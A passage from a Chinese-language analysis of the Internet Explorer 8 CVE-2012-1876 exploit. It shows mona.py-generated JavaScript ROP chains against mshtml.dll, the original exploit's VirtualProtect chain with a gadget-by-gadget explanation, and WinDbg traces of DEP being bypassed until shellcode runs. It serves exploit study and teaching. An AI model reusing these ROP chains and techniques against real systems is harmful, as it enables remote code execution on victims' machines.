 0x74670000 | 0x746a9000 | 0x00039000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [MMDevAPI.DLL] (C:\Windows\system32\MMDevAPI.DLL)
 0x76300000 | 0x76436000 | 0x00136000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [urlmon.dll] (C:\Windows\system32\urlmon.dll)
 0x74660000 | 0x74667000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [AVRT.dll] (C:\Windows\system32\AVRT.dll)
 0x6b2d0000 | 0x6b887000 | 0x005b7000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [mshtml.dll] (C:\Windows\System32\mshtml.dll)
 0x70790000 | 0x707c0000 | 0x00030000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [wdmaud.drv] (C:\Windows\system32\wdmaud.drv)
 0x75c00000 | 0x75c4c000 | 0x0004c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [apphelp.dll] (C:\Windows\system32\apphelp.dll)
 0x75ee0000 | 0x75ffd000 | 0x0011d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [CRYPT32.dll] (C:\Windows\system32\CRYPT32.dll)
 0x75d70000 | 0x75d7c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [MSASN1.dll] (C:\Windows\system32\MSASN1.dll)
 0x76000000 | 0x760d4000 | 0x000d4000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x773f0000 | 0x7749c000 | 0x000ac000 | False  | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x75c50000 | 0x75c5c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\Windows\system32\CRYPTBASE.dll)
 0x705f0000 | 0x70626000 | 0x00036000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [AUDIOSES.DLL] (C:\Windows\system32\AUDIOSES.DLL)
 0x746b0000 | 0x746c3000 | 0x00013000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [dwmapi.dll] (C:\Windows\system32\dwmapi.dll)
 0x77bb0000 | 0x77cec000 | 0x0013c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x6d8d0000 | 0x6d8fb000 | 0x0002b000 | False  | True    | True  |  True    | False  | 8.0.7601.17514 [ieproxy.dll] (C:\Program Files\Internet Explorer\ieproxy.dll)
 0x775a0000 | 0x775b9000 | 0x00019000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll)
 0x76180000 | 0x76185000 | 0x00005000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [PSAPI.DLL] (C:\Windows\system32\PSAPI.DLL)
 0x77cf0000 | 0x77cfa000 | 0x0000a000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\system32\LPK.dll)
 0x77930000 | 0x77b2b000 | 0x001fb000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [iertutil.dll] (C:\Windows\system32\iertutil.dll)
 0x70750000 | 0x70754000 | 0x00004000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ksuser.dll] (C:\Windows\system32\ksuser.dll)
 0x775c0000 | 0x7765d000 | 0x0009d000 | False  | True    | True  |  True    | True   | 1.626.7601.17514 [USP10.dll] (C:\Windows\system32\USP10.dll)
 0x771c0000 | 0x772b5000 | 0x000f5000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [WININET.dll] (C:\Windows\system32\WININET.dll)
 0x73ec0000 | 0x73ec7000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WINNSI.DLL] (C:\Windows\system32\WINNSI.DLL)
 0x75bd0000 | 0x75beb000 | 0x0001b000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SspiCli.dll] (C:\Windows\system32\SspiCli.dll)
 0x73ef0000 | 0x73f0c000 | 0x0001c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [iphlpapi.DLL] (C:\Windows\system32\iphlpapi.DLL)
 0x75ec0000 | 0x75ed2000 | 0x00012000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [DEVOBJ.dll] (C:\Windows\system32\DEVOBJ.dll)
 0x761a0000 | 0x762fc000 | 0x0015c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ole32.dll] (C:\Windows\system32\ole32.dll)
 0x76460000 | 0x764b7000 | 0x00057000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHLWAPI.dll] (C:\Windows\system32\SHLWAPI.dll)
 0x75780000 | 0x75796000 | 0x00016000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTSP.dll] (C:\Windows\system32\CRYPTSP.dll)
 0x774d0000 | 0x77599000 | 0x000c9000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [USER32.dll] (C:\Windows\system32\USER32.dll)
 0x70520000 | 0x70528000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msacm32.drv] (C:\Windows\system32\msacm32.drv)
 0x76440000 | 0x7645f000 | 0x0001f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
 0x77b30000 | 0x77bab000 | 0x0007b000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [comdlg32.dll] (C:\Windows\system32\comdlg32.dll)
 0x6bc20000 | 0x6bc4e000 | 0x0002e000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MLANG.dll] (C:\Windows\system32\MLANG.dll)
 0x71a20000 | 0x71a4a000 | 0x0002a000 | False  | True    | True  |  True    | True   | 3.10.349.0 [msls31.dll] (C:\Windows\System32\msls31.dll)
 0x75520000 | 0x7555b000 | 0x0003b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [rsaenh.dll] (C:\Windows\system32\rsaenh.dll)
 0x74980000 | 0x74a75000 | 0x000f5000 | False  | True    | True  |  True    | True   | 7.0.7601.17514 [propsys.dll] (C:\Windows\system32\propsys.dll)
 0x74540000 | 0x74561000 | 0x00021000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ntmarta.dll] (C:\Windows\system32\ntmarta.dll)
 0x704b0000 | 0x704b7000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [midimap.dll] (C:\Windows\system32\midimap.dll)
 0x74940000 | 0x74980000 | 0x00040000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [uxtheme.dll] (C:\Windows\system32\uxtheme.dll)
 0x73be0000 | 0x73beb000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msimtf.dll] (C:\Windows\system32\msimtf.dll)
 0x77d50000 | 0x77ddf000 | 0x0008f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [OLEAUT32.dll] (C:\Windows\system32\OLEAUT32.dll)
 0x75cd0000 | 0x75cdb000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\Windows\system32\profapi.dll)
 0x76570000 | 0x771ba000 | 0x00c4a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\Windows\system32\SHELL32.dll)
 0x764c0000 | 0x76561000 | 0x000a1000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
 0x760e0000 | 0x76115000 | 0x00035000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ws2_32.DLL] (C:\Windows\system32\ws2_32.DLL)
 0x778a0000 | 0x77923000 | 0x00083000 | False  | True    | True  |  True    | True   | 2001.12.8530.16385 [CLBCatQ.DLL] (C:\Windows\system32\CLBCatQ.DLL)
 0x74b40000 | 0x74cde000 | 0x0019e000 | False  | True    | True  |  True    | True   | 6.10.7601.17514 [comctl32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\comctl32.dll)
 0x70520000 | 0x70528000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSACM32.dll] (C:\Windows\system32\msacm32.drv)
 0x76190000 | 0x76196000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\system32\NSI.dll)
 0x76120000 | 0x76165000 | 0x00045000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WLDAP32.dll] (C:\Windows\system32\WLDAP32.dll)
 0x772c0000 | 0x7738c000 | 0x000cc000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
 0x75e40000 | 0x75e8a000 | 0x0004a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x75c60000 | 0x75cbf000 | 0x0005f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SXS.DLL] (C:\Windows\system32\SXS.DLL)
 0x720c0000 | 0x720f2000 | 0x00032000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WINMM.dll] (C:\Windows\system32\WINMM.dll)
 0x75cc0000 | 0x75cce000 | 0x0000e000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RpcRtRemote.dll] (C:\Windows\system32\RpcRtRemote.dll)
 0x75e90000 | 0x75eb7000 | 0x00027000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [CFGMGR32.dll] (C:\Windows\system32\CFGMGR32.dll)
 0x77d00000 | 0x77d4e000 | 0x0004e000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
 0x75600000 | 0x75644000 | 0x00044000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [dnsapi.DLL] (C:\Windows\system32\dnsapi.DLL)
 0x00130000 | 0x001d6000 | 0x000a6000 | False  | True    | True  |  False   | False  | 8.0.7601.17514 [iexplore.exe] (C:\Program Files\Internet Explorer\iexplore.exe)
 0x750b0000 | 0x750b9000 | 0x00009000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [VERSION.dll] (C:\Windows\System32\VERSION.dll)
 0x77660000 | 0x77700000 | 0x000a0000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ADVAPI32.dll] (C:\Windows\system32\ADVAPI32.dll)
 0x77700000 | 0x7789d000 | 0x0019d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SETUPAPI.dll] (C:\Windows\system32\SETUPAPI.dll)
 0x73b10000 | 0x73b45000 | 0x00035000 | False  | True    | True  |  True    | False  | 8.0.7601.17514 [IEShims.dll] (C:\Program Files\Internet Explorer\IEShims.dll)
 0x72a10000 | 0x72a4c000 | 0x0003c000 | False  | True    | True  |  True    | True   | 7.0.0.0 [OLEACC.dll] (C:\Windows\system32\OLEACC.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------


*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u1f9f%u6b72" + // 0x6b721f9f : ,# POP EBP # RETN [mshtml.dll] 
    "%u1f9f%u6b72" + // 0x6b721f9f : ,# skip 4 bytes [mshtml.dll]
    "%u0f52%u6b43" + // 0x6b430f52 : ,# POP EAX # RETN [mshtml.dll] 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%u5e7f%u6b6f" + // 0x6b6f5e7f : ,# NEG EAX # RETN [mshtml.dll] 
    "%u9a2e%u6b7f" + // 0x6b7f9a2e : ,# XCHG EAX,EBX # RETN [mshtml.dll] 
    "%ud820%u6b2e" + // 0x6b2ed820 : ,# POP EAX # RETN [mshtml.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u2269%u6b2d" + // 0x6b2d2269 : ,# NEG EAX # RETN [mshtml.dll] 
    "%u8ccd%u6b69" + // 0x6b698ccd : ,# XCHG EAX,EDX # RETN [mshtml.dll] 
    "%ucf01%u6b33" + // 0x6b33cf01 : ,# POP ECX # RETN [mshtml.dll] 
    "%ub6ce%u6b80" + // 0x6b80b6ce : ,# &Writable location [mshtml.dll]
    "%ueffe%u6b50" + // 0x6b50effe : ,# POP EDI # RETN [mshtml.dll] 
    "%u38e2%u6b45" + // 0x6b4538e2 : ,# RETN (ROP NOP) [mshtml.dll]
    "%u5e4f%u6b4f" + // 0x6b4f5e4f : ,# POP ESI # RETN [mshtml.dll] 
    "%uc0a3%u6b2d" + // 0x6b2dc0a3 : ,# JMP [EAX] [mshtml.dll]
    "%u0f16%u6b43" + // 0x6b430f16 : ,# POP EAX # RETN [mshtml.dll] 
    "%u1348%u6b2d" + // 0x6b2d1348 : ,# ptr to &VirtualProtect() [IAT mshtml.dll]
    "%udfb8%u6b51" + // 0x6b51dfb8 : ,# PUSHAD # RETN [mshtml.dll] 
    "%u0b54%u6b32" + // 0x6b320b54 : ,# ptr to 'jmp esp' [mshtml.dll]
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------
// pushad的顺序如下：EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%uc897%u6b6c" + // 0x6b6cc897 : ,# POP EBP # RETN [mshtml.dll] 
    "%uc897%u6b6c" + // 0x6b6cc897 : ,# skip 4 bytes [mshtml.dll]
    "%u0eba%u6b43" + // 0x6b430eba : ,# POP EAX # RETN [mshtml.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%u4b13%u6b3d" + // 0x6b3d4b13 : ,# NEG EAX # RETN [mshtml.dll] 
    "%ue023%u6b54" + // 0x6b54e023 : ,# XCHG EAX,EBX # RETN [mshtml.dll] 
    "%u1c7b%u6b61" + // 0x6b611c7b : ,# POP EAX # RETN [mshtml.dll] 
    "%u0ffb%u7ff9" + // 0x7ff90ffb : ,# put delta into eax (-> put 0x00001000 into edx)
    "%u2021%u6b64" + // 0x6b642021 : ,# ADD EAX,80070005 # POP EBP # RETN 0x08 [mshtml.dll] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u8ccd%u6b69" + // 0x6b698ccd : ,# XCHG EAX,EDX # RETN [mshtml.dll] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u0e1a%u6b43" + // 0x6b430e1a : ,# POP EAX # RETN [mshtml.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u4a30%u6b6f" + // 0x6b6f4a30 : ,# NEG EAX # RETN [mshtml.dll] 
    "%u13dc%u6b48" + // 0x6b4813dc : ,# XCHG EAX,ECX # RETN [mshtml.dll] 
    "%ud541%u6b32" + // 0x6b32d541 : ,# POP EDI # RETN [mshtml.dll] 
    "%u38e2%u6b45" + // 0x6b4538e2 : ,# RETN (ROP NOP) [mshtml.dll]
    "%u8b9c%u6b56" + // 0x6b568b9c : ,# POP ESI # RETN [mshtml.dll] 
    "%uc0a3%u6b2d" + // 0x6b2dc0a3 : ,# JMP [EAX] [mshtml.dll]
    "%u0ede%u6b43" + // 0x6b430ede : ,# POP EAX # RETN [mshtml.dll] 
    "%u134c%u6b2d" + // 0x6b2d134c : ,# ptr to &VirtualAlloc() [IAT mshtml.dll]
    "%udfb8%u6b51" + // 0x6b51dfb8 : ,# PUSHAD # RETN [mshtml.dll] 
    "%u0b54%u6b32" + // 0x6b320b54 : ,# ptr to 'jmp esp' [mshtml.dll]
    ""); //  : 


--------------------------------------------------------------------------------------------------


```

首先输出了每个模块的安全机制开启的信息，然后输出支持不同PL的ROP链。

为了看懂原始exp的ROP链构造，此处有两个tip：

1. pushad的压栈顺序：EAX、ECX、EDX、EBX、ESP（初始值）、EBP、ESI、EDI
2. popad的出栈顺序：EDI、ESI、EBP、ESP（初始值）、EBX、EDX、ECX、EAX

看一下原始exp给的rop链吧：

```javascript
    //ROP链中的Gadget地址和参数布局，以实现栈转移和DEP绕过
    shellcode+= unescape("%u"+rop1+"%u"+rop2); // RETN
    shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP
    shellcode+= unescape("%u"+rop5+"%u"+rop6); // XCHG EAX,ESP|call [eax + 8] then goto rop1
    shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP 	
    shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP
    shellcode+= unescape("%u"+rop7+"%u"+rop8); // POP EBX
    shellcode+= unescape("%u1024%u0000"); // Size 0x00001024
    shellcode+= unescape("%u"+rop9+"%u"+rop10); // POP EDX
    shellcode+= unescape("%u0040%u0000"); // 0x00000040
    shellcode+= unescape("%u"+rop11+"%u"+rop12); // POP ECX
    shellcode+= unescape("%u"+writable1+"%u"+writable2); // Writable Location
    shellcode+= unescape("%u"+rop13+"%u"+rop14); // POP EDI
    shellcode+= unescape("%u"+rop1+"%u"+rop2); // RET
    shellcode+= unescape("%u"+rop15+"%u"+rop16); // POP ESI
    shellcode+= unescape("%u"+jmpeax1+"%u"+jmpeax2); // JMP EAX
    shellcode+= unescape("%u"+rop17+"%u"+rop18); // POP EAX
    shellcode+= unescape("%u"+vp1+"%u"+vp2); // VirtualProtect()
    shellcode+= unescape("%u"+rop19+"%u"+rop20); // MOV EAX,DWORD PTR DS:[EAX]
    shellcode+= unescape("%u"+rop21+"%u"+rop22); // PUSHAD
    shellcode+= unescape("%u"+rop23+"%u"+rop24); // PUSH ESP
    shellcode+= unescape("%u9090%u9090"); // NOPs
    shellcode+= unescape("%u9090%u9090"); // NOPs
    shellcode+= unescape("%u9090%u9090"); // NOPs
```

VirtualProtect函数的函数原型如下：

```
BOOL VirtualProtect{ 
  LPVOID lpAddress, 
  DWORD dwsize, 
  DWORD flNewProtect, 
  PDWORD lpflOldProtect 
}
```

首先执行一条retn；然后跳过 ；然后pop ebp，跳过下一条pop ebp的指令并将ebp赋值为pop ebp的地址；然后pop ebx，设置为0x1024；pop edx，设置为0x40；pop ecx，设置为一个可写的位置（写入shellcode）；pop edi，将edi设置为一条ret的地址；然后pop esi，将esi设置为jmp eax的地址；然后pop eax，令eax = VirtualProtect的地址。

总结一下：

EAX: VirtualProtect的IAT

ECX: 要修改的地址，注意这个地址是根据之前预测命中的位置计算出来的

EDX: flProtect(0x40)

EBX: dwSize(0x1024)

ESP: 当前栈顶的位置

EBP: pop ebp;ret

ESI: jmp eax;ret

EDI: ret

然后MOV EAX,DWORD PTR DS:[EAX]会将VirtualProtect函数的真实地址赋值给EAX寄存器，然后执行pushad，将上述寄存器的值压栈。调试跟一下：

```
0:005> dd esp
079f6dcc  6b661041 6b66f920 6b662c60 079f6dec
079f6ddc  00001024 00000040 6bb9fe20 76042341
079f6dec  6b6c3d7e 90909090 90909090 90909090

```

pushad后，栈顶是ret指令。连续执行两次ret，此时：

```
0:005> p
eax=76042341 ebx=00001024 ecx=6bb9fe20 edx=00000040 esi=6b66f920 edi=6b661041
eip=6b66f920 esp=079f6dd4 ebp=6b662c60 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!_tailMerge_CRYPT32_dll+0xf:
6b66f920 ffe0            jmp     eax {kernel32!VirtualProtectStub (76042341)}
0:005> dd esp
079f6dd4  6b662c60 079f6dec 00001024 00000040
079f6de4  6bb9fe20 76042341 6b6c3d7e 90909090
079f6df4  90909090 90909090 0089e8fc 89600000
079f6e04  64d231e5 8b30528b 528b0c52 28728b14
079f6e14  264ab70f c031ff31 7c613cac c1202c02
079f6e24  c7010dcf 5752f0e2 8b10528b d0013c42
079f6e34  8578408b 014a74c0 488b50d0 20588b18
079f6e44  3ce3d301 8b348b49 ff31d601 c1acc031

```

会跳转到jmp eax执行VirtualProtect，参数lpAddress为可写地址0x079f6dec，size为0x1024，flProtect为0x40，函数执行完之后执行pop ebp；ret（注意VirtualProctect函数在返回时执行ret 0x10，自动平衡了堆栈）。

```
0:005> p
eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041
eip=75e622d6 esp=079f6dd4 ebp=6b662c60 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
KERNELBASE!VirtualProtect+0x19:
75e622d6 c21000          ret     10h
0:005> p
eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041
eip=6b662c60 esp=079f6de8 ebp=6b662c60 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!StringCchPrintfA+0x58:
6b662c60 5d              pop     ebp
0:005> dd esp
079f6de8  76042341 6b6c3d7e 90909090 90909090
079f6df8  90909090 0089e8fc 89600000 64d231e5
079f6e08  8b30528b 528b0c52 28728b14 264ab70f
079f6e18  c031ff31 7c613cac c1202c02 c7010dcf
079f6e28  5752f0e2 8b10528b d0013c42 8578408b
079f6e38  014a74c0 488b50d0 20588b18 3ce3d301
079f6e48  8b348b49 ff31d601 c1acc031 c7010dcf
079f6e58  f475e038 3bf87d03 e275247d 24588b58

```

此时执行最后的push esp（pushad的堆栈已经全部处理完毕）；ret，相当于jmp esp，开始执行栈上的代码，再经过一串nop指令就可以执行我们任意的shellcode了！！！

```
0:005> p
eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041
eip=6b6c3d7e esp=079f6df0 ebp=76042341 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CProgSink::GetClassCounter+0x2:
6b6c3d7e 54              push    esp
0:005> dd esp
079f6df0  90909090 90909090 90909090 0089e8fc
079f6e00  89600000 64d231e5 8b30528b 528b0c52
079f6e10  28728b14 264ab70f c031ff31 7c613cac
079f6e20  c1202c02 c7010dcf 5752f0e2 8b10528b
079f6e30  d0013c42 8578408b 014a74c0 488b50d0
079f6e40  20588b18 3ce3d301 8b348b49 ff31d601
079f6e50  c1acc031 c7010dcf f475e038 3bf87d03
079f6e60  e275247d 24588b58 8b66d301 588b4b0c
0:005> p
eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041
eip=6b6c3d7f esp=079f6dec ebp=76042341 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CProgSink::GetClassCounter+0x3:
6b6c3d7f c3              ret
0:005> dd esp
079f6dec  079f6df0 90909090 90909090 90909090
079f6dfc  0089e8fc 89600000 64d231e5 8b30528b
079f6e0c  528b0c52 28728b14 264ab70f c031ff31
079f6e1c  7c613cac c1202c02 c7010dcf 5752f0e2
079f6e2c  8b10528b d0013c42 8578408b 014a74c0
079f6e3c  488b50d0 20588b18 3ce3d301 8b348b49
079f6e4c  ff31d601 c1acc031 c7010dcf f475e038
079f6e5c  3bf87d03 e275247d 24588b58 8b66d301

```

### 6.参考链接

[Windbg漏洞分析调试(一)](https://paper.seebug.org/179/)

[Windbg漏洞分析调试(二)](https://paper.seebug.org/182/)

[Microsoft Internet Explorer 8 - Fixed Col Span ID (Full ASLR + DEP Bypass) (MS12-037)](https://www.exploit-db.com/exploits/24017)

[CVE-2012-1876分析](http://c00c.cc/1493200282.html)

[Targeted Heap Spraying – 0x0c0c0c0c is a Thing of the Past](http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html)